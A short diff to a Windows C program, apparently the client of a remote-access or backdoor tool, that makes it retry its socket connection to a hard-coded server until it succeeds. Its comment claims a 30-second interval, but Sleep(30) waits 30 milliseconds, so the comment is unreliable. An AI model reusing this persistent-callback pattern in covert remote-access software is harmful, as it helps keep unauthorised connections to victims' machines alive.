@@ -63,6 +63,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
 	ServAddr.sin_port = htons(ServPort);
     
-    // connect to server
-    connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr));
+    // attempt to connect to server in evry 30 seconds until it is successful 
+	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
+		Sleep(30);
+	}
 }
